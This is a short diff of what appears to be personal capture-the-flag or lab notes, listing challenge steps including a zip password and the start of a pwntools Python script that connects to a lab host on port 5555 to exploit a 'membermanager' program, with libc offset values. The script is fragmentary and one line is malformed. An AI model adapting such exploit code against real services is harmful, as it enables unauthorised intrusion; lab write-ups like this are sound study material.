@@ -59,4 +59,12 @@ Cheers - Alex
 10) Elasticity is broken
 11) Unzip "Exploitme.zip" with the same key used fo xor crypted message (securewebincrocks)
 ![[Pasted image 20230914104419.png]]
-12) Exploit the 
+12) Exploit the membermanager program
+```
+#!/usr/bin/python3
+from pwn import * 
+import warnings 
+warnings.simplefilter("ignore") 
+shell = remote('10.13.37.10', 5555) 
+ldiff = 0x3c5520 rdiff = 0xf7250 sdiff = 0x45390
+```
